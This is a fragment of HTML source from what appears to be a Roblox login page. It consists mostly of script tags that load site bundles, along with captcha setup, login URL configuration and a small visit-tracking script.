    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ConfigureWebApps" data-bundle-source="Main" src="https://js.rbxcdn.com/5259cfe8a3e36118bd61120693dbba3ba87f2c3641f84bb07e29f1d69fe87523.js"></script>


    
    <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="angular" type="text/javascript" src="https://js.rbxcdn.com/ae3d621886e736e52c97008e085fa286.js"></script>

    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="AngularJsUtilities" data-bundle-source="Main" src="https://js.rbxcdn.com/c1300ec424eab695a3fd12fcaed2ef4f1365d575cb029ee094254ddbcc3396ff.js"></script>

    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="InternationalAngularJs" data-bundle-source="Main" src="https://js.rbxcdn.com/90f18784a43a70553e967191b948f70b0193df565f1605762c3c1e245ab4b55a.js"></script>

    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Thumbnails" data-bundle-source="Main" src="https://js.rbxcdn.com/d5ea02ab1f95cb8aefa0a3f4cd0151b4220841fc448c2072d3481d95017db6ab.js"></script>






<div id="presence-registration-bootstrap-data" data-is-enabled="False" data-interval="15000"></div><script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="PresenceRegistration" data-bundle-source="Main" src="https://js.rbxcdn.com/0a83202cf5f2310227e607928f73a26cdaa7d5c27f892b99ef51ec3b863a694d.js"></script>
    <div ng-modules="baseTemplateApp" class="ng-scope">
        <script type="text/javascript" src="https://js.rbxcdn.com/ffcc04436179c6b2a6668fdfcfbf62b1.js"></script>
    </div>

    <div ng-modules="pageTemplateApp" class="ng-scope">
        <script type="text/javascript" src="https://js.rbxcdn.com/3e544c8e724dcdc296258b0ca69401a9.js"></script>
    </div>

<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="VerificationUpsell" data-bundle-source="Main" src="https://js.rbxcdn.com/18a7f7264576e5ec1e8648522084c182064bdafd708694c43f28fc5686fb5dbf.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.VerificationUpsell" data-bundle-source="Unknown" src="https://js.rbxcdn.com/5298210691b2bad66e2235484470a78cfd7ed8ba0b547aa1af5bbfc94be8dab0.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.VerificationUpsell" data-bundle-source="Unknown" src="https://js.rbxcdn.com/ac18954a9be17173b1dd2338337648e1d8c219e2be61ebacdc2464bc01a39397.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Experimentation" data-bundle-source="Main" src="https://js.rbxcdn.com/c4b0a446b38285f3db5472340f4ef27d737c87b78348e36dc7acbcfec89d70bf.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Navigation" data-bundle-source="Main" src="https://js.rbxcdn.com/ff8edb7d02ecfaedf30abf7b30e8060c665a826cfbc4b6dd68a9448608e0eab3.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.AlertsAndOptions" data-bundle-source="Unknown" src="https://js.rbxcdn.com/385a62cb16e1c8524da81c17728733d79e3ad9ccbc342d982fe79352f8785dba.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.AlertsAndOptions" data-bundle-source="Unknown" src="https://js.rbxcdn.com/57d1b7776de993a3bf8ace38e6efd8f8ce5b9a294362c029990f0cf131548531.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ShopDialog" data-bundle-source="Unknown" src="https://js.rbxcdn.com/95fdafe5af749e388de603b9ee7f67bb092c3c790badc572db4e2bca0c32b49a.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ShopDialog" data-bundle-source="Unknown" src="https://js.rbxcdn.com/c0606e8d6eb4487cdc70d318e6de3d9aaeeb465ddb84acd95139011e56c5e5c6.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Features" data-bundle-source="Unknown" src="https://js.rbxcdn.com/c629f6739d6903fec0d935d26a9cea02ff757856d4ed73a83fd1535affea0300.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Features" data-bundle-source="Unknown" src="https://js.rbxcdn.com/5370e5e55fc9993ec53b0a4195e82290b8c1c5f95a1fb5cd11a2ec82d5d07809.js"></script>

    

    
    <script type="text/javascript">Roblox.config.externalResources = [];Roblox.config.paths['Pages.Catalog'] = 'https://js.rbxcdn.com/109d883fe3988fca757e26e341ed0fe8.js';Roblox.config.paths['Pages.CatalogShared'] = 'https://js.rbxcdn.com/bcba3a83febab35eb41f3a0b8b96db37.js';Roblox.config.paths['Widgets.AvatarImage'] = 'https://js.rbxcdn.com/7d49ac94271bd506077acc9d0130eebb.js';Roblox.config.paths['Widgets.DropdownMenu'] = 'https://js.rbxcdn.com/da553e6b77b3d79bec37441b5fb317e7.js';Roblox.config.paths['Widgets.HierarchicalDropdown'] = 'https://js.rbxcdn.com/4a0af9989732810851e9e12809aeb8ad.js';Roblox.config.paths['Widgets.ItemImage'] = 'https://js.rbxcdn.com/61a0490ba23afa17f9ecca2a079a6a57.js';Roblox.config.paths['Widgets.PlaceImage'] = 'https://js.rbxcdn.com/a6df74a754523e097cab747621643c98.js';</script>

        <script>
            $(function () {
                Roblox.DeveloperConsoleWarning.showWarning();
            });
        </script>
    

<script type="text/javascript">
    $(function(){
        function trackReturns() {
            function dayDiff(d1, d2) {
                return Math.floor((d1-d2)/86400000);
            }
            if (!localStorage) {
                return false;
            }

            var cookieName = 'RBXReturn';
            var cookieOptions = {expires:9001};
            var cookieStr = localStorage.getItem(cookieName) || "";
            var cookie = {};

            try {
                cookie = JSON.parse(cookieStr);
            } catch (ex) {
                // busted cookie string from old previous version of the code
            }

            try {
                if (typeof cookie.ts === "undefined" || isNaN(new Date(cookie.ts))) {
                    localStorage.setItem(cookieName, JSON.stringify({ ts: new Date().toDateString() }));
                    return false;
                }
            } catch (ex) {
                return false;
            }

            var daysSinceFirstVisit = dayDiff(new Date(), new Date(cookie.ts));
            if (daysSinceFirstVisit == 1 && typeof cookie.odr === "undefined") {
                RobloxEventManager.triggerEvent('rbx_evt_odr', {});
                cookie.odr = 1;
            }
            if (daysSinceFirstVisit >= 1 && daysSinceFirstVisit <= 7 && typeof cookie.sdr === "undefined") {
                RobloxEventManager.triggerEvent('rbx_evt_sdr', {});
                cookie.sdr = 1;
            }
            try {
                localStorage.setItem(cookieName, JSON.stringify(cookie));
            } catch (ex) {
                return false;
            }
        }

        GoogleListener.init();


    
        RobloxEventManager.initialize(true);
        RobloxEventManager.triggerEvent('rbx_evt_pageview');
        trackReturns();
        

    
        RobloxEventManager._idleInterval = 450000;
        RobloxEventManager.registerCookieStoreEvent('rbx_evt_initial_install_start');
        RobloxEventManager.registerCookieStoreEvent('rbx_evt_ftp');
        RobloxEventManager.registerCookieStoreEvent('rbx_evt_initial_install_success');
        RobloxEventManager.registerCookieStoreEvent('rbx_evt_fmp');
        

    });

</script>


    
    

<script type="text/javascript">
    var Roblox = Roblox || {};
    Roblox.UpsellAdModal = Roblox.UpsellAdModal || {};

    Roblox.UpsellAdModal.Resources = {
        title: "Remove Ads Like This",
        body: "Builders Club members do not see external ads like these.",
        accept: "Upgrade Now",
        decline: "No, thanks"
    };
</script>

    
    <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="page" type="text/javascript" src="https://js.rbxcdn.com/03772e70e19bd2996b90e1e296a0a8d4.js"></script>


    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="StyleGuide" data-bundle-source="Main" src="https://js.rbxcdn.com/504b13e9d52c1a094ac6c2f89d9f89d347ecdceda9cda792c79b237040416e95.js"></script>

<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CookieBannerV3" data-bundle-source="Main" src="https://js.rbxcdn.com/7693d98990f875a88c91c0385e1b0542bb51913fb34b23f414b6890d90353c40.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Messages" data-bundle-source="Unknown" src="https://js.rbxcdn.com/18dede93de3aac02225e1e6e9957d98d6983c39fc9e76eb0cdb05090e5551f95.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Messages" data-bundle-source="Unknown" src="https://js.rbxcdn.com/5b148ca445e1fd4ef905bc3665b2e29d065ab357cc88fd68be95b519f6e2da0d.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Tracking" data-bundle-source="Unknown" src="https://js.rbxcdn.com/ce6a4105a4d28cac59aa57a3d6615d56ba63526569ebfd88d49ac363d61caddb.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Tracking" data-bundle-source="Unknown" src="https://js.rbxcdn.com/fb47e86d6d7deaf62c7c5c8a62d915361b3f9b47503976e24e4fdd44710a492e.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Footer" data-bundle-source="Main" src="https://js.rbxcdn.com/bffafd994791f59d1efb67723313fc0f59b58fef8dec7cf83535c8f4d1d1ebd9.js"></script>
    
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Captcha" data-bundle-source="Main" src="https://js.rbxcdn.com/523958ed41b5e1cfecdd3a29a57074d0dd62ff6ba572fefbebc76ff8d48024d5.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CaptchaCore" data-bundle-source="Main" src="https://js.rbxcdn.com/1a6389791b88e1ce869baa0b43e2f423e77141f6913f9d51eeda7d460d53aa97.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Challenge" data-bundle-source="Main" src="https://js.rbxcdn.com/9e675e0889beedfe54445cb43663c91dcfe0cd2b6e7ac6410de9f5a7ba9bba98.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.TwoStepVerification" data-bundle-source="Unknown" src="https://js.rbxcdn.com/d311ba98c3ebc425ac4c193e721c2f0770cd9c02e4c426ddfdfea5cfca6dea3e.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.TwoStepVerification" data-bundle-source="Unknown" src="https://js.rbxcdn.com/4fc833eee4c094363591f896908c64a8dca43b9128112cfd0bed0a7028257b35.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.SecurityQuestions" data-bundle-source="Unknown" src="https://js.rbxcdn.com/3574cff8a3839614386f61fdf914e02e5217a7878601ce33a9ff41f94a2ad8e3.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.SecurityQuestions" data-bundle-source="Unknown" src="https://js.rbxcdn.com/a054aec7da3a2b719cf38e09c5f6a9f45af54f6e632aa964ccc8b5ec2d83b9b0.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.Captcha" data-bundle-source="Unknown" src="https://js.rbxcdn.com/6a01cbf296d3e8aa5fefa3dc991cac628716cceded614fb84cbadfd78f507d85.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.Captcha" data-bundle-source="Unknown" src="https://js.rbxcdn.com/0f46a1db16bff49a6b3dbb2c17a6723366faf5a93870711a8f92fb9058a1776c.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Reauthentication" data-bundle-source="Unknown" src="https://js.rbxcdn.com/1057677ca91f349db02f7b279cdfbf25bec8098a13c7870317f7ad4cd4779a97.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Reauthentication" data-bundle-source="Unknown" src="https://js.rbxcdn.com/3241cdd45931acc3efce4b49df4fe9583ed09d79994cc782364a84c4e851af5c.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ProofOfWorkChallenge" data-bundle-source="Unknown" src="https://js.rbxcdn.com/4963a609b0bb2465ffa6a7ad10bcff85662879d2f342f0cb1a2485320dd81eb5.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ProofOfWorkChallenge" data-bundle-source="Unknown" src="https://js.rbxcdn.com/c239c2a4cca7b50a6b45a6c32ee7ddfaa0bba7011c733c6db5aad0f6a7927d54.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CrossDeviceLoginDisplayCode" data-bundle-source="Main" src="https://js.rbxcdn.com/fad5c0064cbdb1d4c125246ddde8d290eaffef2d3dda9eb3bad041acc2649f95.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.CrossDevice" data-bundle-source="Unknown" src="https://js.rbxcdn.com/c2c57345b0dcab109230c865d20c21b671a3bc98aae621048a84177b7764fe09.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.CrossDevice" data-bundle-source="Unknown" src="https://js.rbxcdn.com/865e2b4afe6bf412a79a1bd34fab856add01e51485d3ff24b9c2951130c9c705.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ReactLogin" data-bundle-source="Main" src="/login/js"></script>
<script>
<div class="container-main 
                
                
                
                
                
                " id="container-main" tabindex="-1">
            <script type="text/javascript">
                if (top.location != self.location) {
                    top.location = self.location.href;
                }
            </script>

        <div class="alert-container">
            <noscript><div><div class="alert-info" role="alert">Please enable Javascript to use all the features on this site.</div></div></noscript>




        </div>


        <div class="content">

<script src="https://roblox-api.arkoselabs.com/fc/api/?onload=reportFunCaptchaLoaded" async="" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportResourceError('funcaptcha')"></script>
<script type="text/javascript">
    var Roblox = Roblox || {};
    $(function () {
        var funCaptcha = Roblox.FunCaptcha;
        if (funCaptcha) {
            var captchaTypes = [{"Type":"Login","PublicKey":"9F35E182-C93C-EBCC-A31D-CF8ED317B996","ApiUrl":"https://captcha.roblox.com/v1/funcaptcha/login/web"}];
            funCaptcha.addCaptchaTypes(captchaTypes, true);
            funCaptcha.setMaxRetriesOnTokenValidationFailure(0);
            funCaptcha.setPerAppTypeLoggingEnabled(false);
            funCaptcha.setRetryIntervalRange(500, 1500);
        }
    });

    // Necessary because of how FunCaptcha js executes callback
    // i.e. window["{function name}"]
    function reportFunCaptchaLoaded()
    {
        if (Roblox.BundleDetector)
        {
            Roblox.BundleDetector.reportResourceLoaded("funcaptcha");
        }
    }
</script>
<div role="dialog" id="dialog">
</div>
<div id="react-login-container" class="login-container" data-return-url="" data-enable-react-ui="true">
<div id="login-base">

<div id="crossDeviceLoginDisplayCodeModal-container">
</div>
</div>
</div>
<script>
    var Roblox = Roblox || {};
    Roblox.LoginMeta = {
        signupUrl: "https://www.roblox.com/account/signupredir",
        forgotCredentialsUrl: "https://www.roblox.com/login/forgot-password-or-username",
        homeUrl: "https://www.roblox.com/home",
        securityNotificationUrl: "https://www.roblox.com/login/securitynotification",
        apiProxyUrl: "https://api.roblox.com",
        fbSignInUrl: "",
        loginPageUrl: "https://www.roblox.com/newlogin",
        isLoginWithEmailEnabled: true,
        isLoginWithPhoneEnabled: true,
        isPromptUnverifiedEmailsEnabled: false
    };
</script>

        <script type="text/javascript" src="https://cdns.gigya.com/js/gigya.js?apiKey=" async="" defer="">
            {
                bypassCookiePolicy: 'never'
            }
        </script>


<div id="SocialIdentitiesInformation" data-rbx-login-redirect-url="/social/postlogin" data-context="loginPage">
</div>
        </div>
            

<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.Login" data-bundle-source="Unknown" src="https://js.rbxcdn.com/cf8007c7bce4435c31ba6aaaa41b27285e3a2e3c2bca7c2fdbb03da982e32a76.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.Login" data-bundle-source="Unknown" src="https://js.rbxcdn.com/80ebdc7734ff5f0d4f9def8f7ebb22ee6c85d8962c905b42ab37dc2f29e2d056.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.Captcha" data-bundle-source="Unknown" src="https://js.rbxcdn.com/fe345fa49171e73999c333520b87bb3051dbd4c4e74c2ca9ebf8a8c05110f96a.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.Captcha" data-bundle-source="Unknown" src="https://js.rbxcdn.com/a6621e0d27855e4e2afe111af5aff2146ad81993b241f77c3188671c2704b7db.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="AccountRecoveryModal" data-bundle-source="Main" src="https://js.rbxcdn.com/0cb8d2d6f4d1670adfee3b204fcb3a2dbf61819b82895f8257f0e5055d2c5b2b.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.ResetPassword" data-bundle-source="Unknown" src="https://js.rbxcdn.com/e067b89cb37bc993adf99c89d8200fe9dbf7363de77dd657d04a48923c32501c.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.ResetPassword" data-bundle-source="Unknown" src="https://js.rbxcdn.com/86b7462506fcd8b4766868f3db06469c18bd70adb9793695bfbb3ef2cf48f4fd.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Controls" data-bundle-source="Unknown" src="https://js.rbxcdn.com/1e9c21f67e9901f767acd1db03c4a5c6029d4bc0862424e80c746d6e3cf5b99c.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Controls" data-bundle-source="Unknown" src="https://js.rbxcdn.com/5c44d71f75449192684a6558fdffae735d08a0a29e18c656dc0374df397a0050.js"></script>




    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="ItemPurchase" data-bundle-source="Main" src="https://js.rbxcdn.com/5804331763d8dd8d8fb671924b73023bd1feddd205229569f18413e6f0190f93.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Item" data-bundle-source="Unknown" src="https://js.rbxcdn.com/9cf047a292f5735b2ce9c1896e1951a873acc17e0d794deddde210b8bd91d6d4.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Item" data-bundle-source="Unknown" src="https://js.rbxcdn.com/0eb9f3bc4309642fdf241b8263d8987cbe07add49b9342084cdc23be4e042d93.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Purchasing.PurchaseDialog" data-bundle-source="Unknown" src="https://js.rbxcdn.com/7918ac8b721b946f2800652b084166ae795408706e447c98a9af8ca3e8a0cbc0.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Purchasing.PurchaseDialog" data-bundle-source="Unknown" src="https://js.rbxcdn.com/4e1037868737fa797b0e3248bc05479c925d8029ec146d6633aeebd9e0bb6c71.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ItemModel" data-bundle-source="Unknown" src="https://js.rbxcdn.com/97b99d5ea1fd09bf3fa4aed595502676b5c6d366675698913916b7b0f1b33a30.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ItemModel" data-bundle-source="Unknown" src="https://js.rbxcdn.com/8f8d451cbe04b730d167b5ce92019da934a5c2da928ca13d9b3eb15cbe2ff5d5.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="IdVerification" data-bundle-source="Main" src="https://js.rbxcdn.com/6fb6e995f12e838d8f66c5e1ab8a5b60557dc6e1cd355ecbcff835358590ab90.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Verification.Identity" data-bundle-source="Unknown" src="https://js.rbxcdn.com/6ca23c4bef0b8c2ee82d1bcf9bb3c52c2d8c6b1c6c69ad40ed2d03d0887335e2.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Verification.Identity" data-bundle-source="Unknown" src="https://js.rbxcdn.com/3f6cf43ba9cc024bb84a85caee38f7c5b98ce5a2e3006d197f21eecc25f495c7.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="GameLaunch" data-bundle-source="Main" src="https://js.rbxcdn.com/c8a5a277ce6a0cbc4f7b673d7d59e93c63a62a2d86e68d32eac55af32a553945.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.VisitGame" data-bundle-source="Unknown" src="https://js.rbxcdn.com/f5964480d72a66fed298d36e9ad7c0a033020f0f488a49773b129905e4390e60.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.VisitGame" data-bundle-source="Unknown" src="https://js.rbxcdn.com/d720f5c5c32eb353fd76c5a101f47e529363a19bf44c18b01b501e0c648c81b4.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.GameLaunchGuestMode" data-bundle-source="Unknown" src="https://js.rbxcdn.com/f41ec06eeae79fa94e6ae9f435b0a1c6743085e898884eddb4d4025ca3af8a44.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.GameLaunchGuestMode" data-bundle-source="Unknown" src="https://js.rbxcdn.com/6852af8f7df15395ccb3d121a914ee7301a7162f5afb3395575c6075c617923f.js"></script>


    


    




<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="UserAgreementsChecker" data-bundle-source="Main" src="https://js.rbxcdn.com/a411b4655a0c97ad1d8209c2daa1e92b0dfc5d66716efcfea310f491aabf1ef6.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.UserAgreements" data-bundle-source="Unknown" src="https://js.rbxcdn.com/c46b4fb03550b521b63f90cdca3214e620c53f676987f9c644dc3ed60a9d74c9.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.UserAgreements" data-bundle-source="Unknown" src="https://js.rbxcdn.com/358e6ae5bebb0fa9326d0de99d3ee229ee63236bf44ed11b9ab1d314c7972e79.js"></script>

<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="RobloxBadges" data-bundle-source="Main" src="https://js.rbxcdn.com/f27333a87841bb90751e1c574a5d1c64235caebf8c491fc134b3cc4360804026.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ProfileBadges" data-bundle-source="Unknown" src="https://js.rbxcdn.com/c0280cb8ef71ae9c6ca1e5aa0aafff731d475b44618831a84b70cd71b7db1c15.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.ProfileBadges" data-bundle-source="Unknown" src="https://js.rbxcdn.com/9b76788c6a7175a383cabecc958693b010c83931a57f99f795d2851058b1750b.js"></script> 
<script>
